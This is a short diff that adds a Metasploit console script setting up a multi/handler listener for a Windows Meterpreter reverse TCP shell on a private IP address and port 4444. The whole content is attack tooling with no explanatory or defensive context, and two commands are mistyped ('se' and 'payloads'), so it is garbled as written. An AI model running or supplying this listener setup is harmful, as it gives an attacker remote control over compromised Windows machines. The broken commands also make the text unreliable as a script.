@@ -1,0 +1,9 @@
+se exploit/multi/handler
+set payloads windows/meterpreter/reverse_tcp
+set lhost 192.168.1.88
+set lport 4444
+exploit
+
+
+
+
